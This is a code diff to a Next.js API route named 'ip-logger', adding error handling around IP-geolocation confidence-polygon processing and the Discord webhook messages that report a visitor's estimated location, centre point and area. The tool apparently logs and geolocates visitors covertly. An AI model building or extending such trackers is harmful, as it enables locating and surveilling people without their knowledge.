@@ -1,4 +1,4 @@
-// /pages/api/ip-logger.js - WITH SEPARATE CONFIDENCE MAP WEBHOOK
+// /pages/api/ip-logger.js - FIXED with error handling for confidence area
 export default async function handler(req, res) {
   // CORS headers
   res.setHeader('Access-Control-Allow-Origin', '*');
@@ -43,7 +43,7 @@ export default async function handler(req, res) {
       
       const rawText = await response.text();
       ipData = JSON.parse(rawText);
-      console.log('DEBUG: Main fetch OK, confidence:', ipData?.confidence);
+      console.log('DEBUG: Main fetch OK, confidenceArea type:', typeof ipData?.confidenceArea);
     } catch (fetchError) {
       console.error('DEBUG: Fetch failed:', fetchError.message);
       return res.status(500).json({ success: false, error: 'Failed to fetch data' });
@@ -66,75 +66,101 @@ export default async function handler(req, res) {
     const confidenceArea = ipData?.confidenceArea || null;
     const accuracyRadius = ipData?.location?.accuracyRadius || null;
 
-    console.log('DEBUG: Confidence area exists:', !!confidenceArea);
+    console.log('DEBUG: Confidence area is array?', Array.isArray(confidenceArea));
 
-    // --- ANALYZE CONFIDENCE AREA DATA ---
+    // --- SAFE CONFIDENCE AREA ANALYSIS ---
     let confidenceStats = {
       hasData: false,
       pointCount: 0,
       areaType: 'None',
       bounds: null,
       centerPoint: null,
-      approxAreaKm: null
+      approxAreaKm: null,
+      error: null
     };
 
-    // Process confidence area polygon if it exists
+    // SAFELY Process confidence area polygon if it exists
     if (confidenceArea && Array.isArray(confidenceArea)) {
-      confidenceStats.hasData = true;
-      confidenceStats.pointCount = confidenceArea.length;
-      confidenceStats.areaType = 'Polygon';
-      
-      // Calculate bounds (min/max lat/lon)
-      let minLat = 90, maxLat = -90, minLon = 180, maxLon = -180;
-      let sumLat = 0, sumLon = 0;
-      
-      confidenceArea.forEach(point => {
-        if (Array.isArray(point) && point.length >= 2) {
-          // BigDataCloud format: [longitude, latitude]
-          const lon = point[0];
-          const lat = point[1];
-          
-          minLat = Math.min(minLat, lat);
-          maxLat = Math.max(maxLat, lat);
-          minLon = Math.min(minLon, lon);
-          maxLon = Math.max(maxLon, lon);
-          
-          sumLat += lat;
-          sumLon += lon;
-        }
-      });
-      
-      confidenceStats.bounds = {
-        minLat: minLat.toFixed(6),
-        maxLat: maxLat.toFixed(6),
-        minLon: minLon.toFixed(6),
-        maxLon: maxLon.toFixed(6),
-        latRange: (maxLat - minLat).toFixed(6),
-        lonRange: (maxLon - minLon).toFixed(6)
-      };
-      
-      // Calculate center point (average of all polygon points)
-      if (confidenceStats.pointCount > 0) {
-        confidenceStats.centerPoint = {
-          lat: (sumLat / confidenceStats.pointCount).toFixed(6),
-          lon: (sumLon / confidenceStats.pointCount).toFixed(6)
-        };
+      try {
+        console.log('DEBUG: Confidence area length:', confidenceArea.length);
+        confidenceStats.hasData = true;
+        confidenceStats.pointCount = confidenceArea.length;
+        confidenceStats.areaType = 'Polygon';
         
-        // Approximate area in square kilometers (simple rectangle approximation)
-        const latKm = (maxLat - minLat) * 111.32; // 1 degree latitude ≈ 111.32 km
-        const lonKm = (maxLon - minLon) * (111.32 * Math.cos((minLat + maxLat) * Math.PI / 360));
-        confidenceStats.approxAreaKm = Math.abs(latKm * lonKm).toFixed(1);
+        // Calculate bounds with SAFE number checking
+        let minLat = 90, maxLat = -90, minLon = 180, maxLon = -180;
+        let sumLat = 0, sumLon = 0;
+        let validPoints = 0;
+        
+        confidenceArea.forEach(point => {
+          try {
+            if (Array.isArray(point) && point.length >= 2) {
+              // SAFELY extract coordinates
+              const lon = parseFloat(point[0]);
+              const lat = parseFloat(point[1]);
+              
+              // Check if coordinates are valid numbers
+              if (!isNaN(lon) && !isNaN(lat) && 
+                  Math.abs(lat) <= 90 && Math.abs(lon) <= 180) {
+                
+                minLat = Math.min(minLat, lat);
+                maxLat = Math.max(maxLat, lat);
+                minLon = Math.min(minLon, lon);
+                maxLon = Math.max(maxLon, lon);
+                
+                sumLat += lat;
+                sumLon += lon;
+                validPoints++;
+              }
+            }
+          } catch (pointError) {
+            console.warn('DEBUG: Error processing point:', point, pointError.message);
+          }
+        });
+        
+        if (validPoints > 0) {
+          confidenceStats.bounds = {
+            minLat: minLat.toFixed(6),
+            maxLat: maxLat.toFixed(6),
+            minLon: minLon.toFixed(6),
+            maxLon: maxLon.toFixed(6),
+            latRange: (maxLat - minLat).toFixed(6),
+            lonRange: (maxLon - minLon).toFixed(6)
+          };
+          
+          confidenceStats.centerPoint = {
+            lat: (sumLat / validPoints).toFixed(6),
+            lon: (sumLon / validPoints).toFixed(6)
+          };
+          
+          // Approximate area in square kilometers
+          const latKm = (maxLat - minLat) * 111.32;
+          const lonKm = (maxLon - minLon) * (111.32 * Math.cos((minLat + maxLat) * Math.PI / 360));
+          confidenceStats.approxAreaKm = Math.abs(latKm * lonKm).toFixed(1);
+        } else {
+          confidenceStats.error = 'No valid coordinate points found';
+          confidenceStats.hasData = false;
+        }
+      } catch (statsError) {
+        console.error('DEBUG: Error calculating confidence stats:', statsError.message);
+        confidenceStats.error = statsError.message;
+        confidenceStats.hasData = false;
       }
     }
 
     // --- Generate Confidence Area Visualization ---
     let confidenceMapUrl = null;
     if (confidenceArea && Array.isArray(confidenceArea) && confidenceArea.length > 0) {
-      // Create GeoJSON for visualization
-      const geoJson = {
-        type: "FeatureCollection",
-        features: [
-          {
+      try {
+        // Create SAFE GeoJSON with validation
+        const geoJson = {
+          type: "FeatureCollection",
+          features: []
+        };
+        
+        // Add point feature if coordinates are valid
+        if (latitude && longitude && !isNaN(latitude) && !isNaN(longitude)) {
+          geoJson.features.push({
             type: "Feature",
             properties: {
               name: "IP Location",
@@ -143,10 +169,23 @@ export default async function handler(req, res) {
             },
             geometry: {
               type: "Point",
-              coordinates: [longitude, latitude]
+              coordinates: [parseFloat(longitude), parseFloat(latitude)]
             }
-          },
-          {
+          });
+        }
+        
+        // Add polygon feature with SAFE coordinates
+        const safePolygon = confidenceArea
+          .filter(point => 
+            Array.isArray(point) && 
+            point.length >= 2 && 
+            !isNaN(parseFloat(point[0])) && 
+            !isNaN(parseFloat(point[1]))
+          )
+          .map(point => [parseFloat(point[0]), parseFloat(point[1])]);
+        
+        if (safePolygon.length >= 3) { // Need at least 3 points for a polygon
+          geoJson.features.push({
             type: "Feature",
             properties: {
               name: "Confidence Area",
@@ -158,21 +197,24 @@ export default async function handler(req, res) {
             },
             geometry: {
               type: "Polygon",
-              coordinates: [confidenceArea]
+              coordinates: [safePolygon]
             }
-          }
-        ]
-      };
-      
-      // URL encode for geojson.io
-      const encodedGeoJson = encodeURIComponent(JSON.stringify(geoJson));
-      confidenceMapUrl = `https://geojson.io/#data=data:application/json,${encodedGeoJson}`;
-      console.log('DEBUG: Created confidence map URL');
+          });
+        }
+        
+        if (geoJson.features.length > 0) {
+          const encodedGeoJson = encodeURIComponent(JSON.stringify(geoJson));
+          confidenceMapUrl = `https://geojson.io/#data=data:application/json,${encodedGeoJson}`;
+          console.log('DEBUG: Created confidence map URL');
+        }
+      } catch (mapError) {
+        console.error('DEBUG: Error creating map URL:', mapError.message);
+      }
     }
 
     // --- Simple Map URL (fallback) ---
     let simpleMapUrl = null;
-    if (latitude && longitude) {
+    if (latitude && longitude && !isNaN(latitude) && !isNaN(longitude)) {
       simpleMapUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=12`;
     }
 
@@ -210,12 +252,22 @@ export default async function handler(req, res) {
       confidenceLevel: confidence,
       confidenceArea: confidenceStats,
       visualizationUrl: confidenceMapUrl,
-      rawPolygonSample: confidenceArea ? 
-        confidenceArea.slice(0, 3).map(p => `[${p[0].toFixed(4)}, ${p[1].toFixed(4)}]`).join(', ') + (confidenceArea.length > 3 ? `... (+${confidenceArea.length - 3} more)` : '') : 
+      rawPolygonSample: confidenceArea && Array.isArray(confidenceArea) ? 
+        confidenceArea.slice(0, 3).map(p => {
+          if (Array.isArray(p) && p.length >= 2) {
+            const lon = p[0];
+            const lat = p[1];
+            // SAFELY format numbers
+            const lonStr = typeof lon === 'number' ? lon.toFixed(4) : String(lon);
+            const latStr = typeof lat === 'number' ? lat.toFixed(4) : String(lat);
+            return `[${lonStr}, ${latStr}]`;
+          }
+          return '[Invalid point]';
+        }).join(', ') + (confidenceArea.length > 3 ? `... (+${confidenceArea.length - 3} more)` : '') : 
         'No polygon data'
     };
 
-    console.log('DEBUG: Built confidence data:', confidenceStats);
+    console.log('DEBUG: Built confidence data, hasData:', confidenceStats.hasData);
 
     // --- Send Discord Webhooks ---
     const webhookResults = {
@@ -230,8 +282,8 @@ export default async function handler(req, res) {
         webhookResults.main.sent = true;
         console.log('DEBUG: Main webhook sent');
         
-        // Send CONFIDENCE DETAILS webhook (only if we have confidence data)
-        if (confidenceStats.hasData) {
+        // Send CONFIDENCE DETAILS webhook (only if we have valid confidence data)
+        if (confidenceStats.hasData && !confidenceStats.error) {
           try {
             await sendConfidenceWebhook(confidenceData);
             webhookResults.confidence.sent = true;
@@ -241,7 +293,10 @@ export default async function handler(req, res) {
             console.error('DEBUG: Confidence webhook failed:', confError.message);
           }
         } else {
-          console.log('DEBUG: No confidence data to send separate webhook');
+          console.log('DEBUG: No valid confidence data to send separate webhook');
+          if (confidenceStats.error) {
+            console.log('DEBUG: Confidence error:', confidenceStats.error);
+          }
         }
       } catch (mainError) {
         webhookResults.main.error = mainError.message;
@@ -264,7 +319,8 @@ export default async function handler(req, res) {
     return res.status(500).json({ 
       success: false, 
       error: 'Internal server error',
-      message: err.message 
+      message: err.message,
+      stack: process.env.NODE_ENV === 'development' ? err.stack : undefined
     });
   }
 }
@@ -402,22 +458,35 @@ async function sendConfidenceWebhook(data) {
         name: '📐 Polygon Shape', 
         value: `**Points:** ${stats.pointCount}\n**Type:** ${stats.areaType}`,
         inline: true 
-      },
-      { 
-        name: '📏 Bounding Box', 
-        value: `**Lat:** ${stats.bounds.minLat} → ${stats.bounds.maxLat} (Δ${stats.bounds.latRange}°)\n**Lon:** ${stats.bounds.minLon} → ${stats.bounds.maxLon} (Δ${stats.bounds.lonRange}°)`,
-        inline: true 
-      },
-      { 
-        name: '📍 Polygon Center', 
-        value: `${stats.centerPoint.lat}, ${stats.centerPoint.lon}`,
-        inline: true 
-      },
-      { 
-        name: '📐 Approximate Area', 
-        value: `${stats.approxAreaKm} km²`,
-        inline: true 
-      },
+      }
+    );
+
+    if (stats.bounds) {
+      fields.push(
+        { 
+          name: '📏 Bounding Box', 
+          value: `**Lat:** ${stats.bounds.minLat} → ${stats.bounds.maxLat} (Δ${stats.bounds.latRange}°)\n**Lon:** ${stats.bounds.minLon} → ${stats.bounds.maxLon} (Δ${stats.bounds.lonRange}°)`,
+          inline: true 
+        },
+        { 
+          name: '📍 Polygon Center', 
+          value: `${stats.centerPoint.lat}, ${stats.centerPoint.lon}`,
+          inline: true 
+        }
+      );
+    }
+
+    if (stats.approxAreaKm) {
+      fields.push(
+        { 
+          name: '📐 Approximate Area', 
+          value: `${stats.approxAreaKm} km²`,
+          inline: true 
+        }
+      );
+    }
+    
+    fields.push(
       { 
         name: '📋 Data Format', 
         value: 'GeoJSON Polygon\n[Longitude, Latitude] pairs',
@@ -426,15 +495,17 @@ async function sendConfidenceWebhook(data) {
     );
     
     // Add polygon sample
-    fields.push({
-      name: '📝 Polygon Sample (first 3 points)',
-      value: `\`\`\`json\n${data.rawPolygonSample}\`\`\``,
-      inline: false
-    });
+    if (data.rawPolygonSample && data.rawPolygonSample !== 'No polygon data') {
+      fields.push({
+        name: '📝 Polygon Sample',
+        value: `\`\`\`${data.rawPolygonSample}\`\`\``,
+        inline: false
+      });
+    }
   } else {
     fields.push({
       name: '⚠️ Confidence Data',
-      value: 'No confidence area polygon available for this IP address.',
+      value: stats.error ? `Error: ${stats.error}` : 'No confidence area polygon available for this IP address.',
       inline: false
     });
   }
@@ -471,4 +542,4 @@ async function sendConfidenceWebhook(data) {
     const errorText = await response.text();
     throw new Error(`Discord API: ${response.status} - ${errorText}`);
   }
-      }
+}
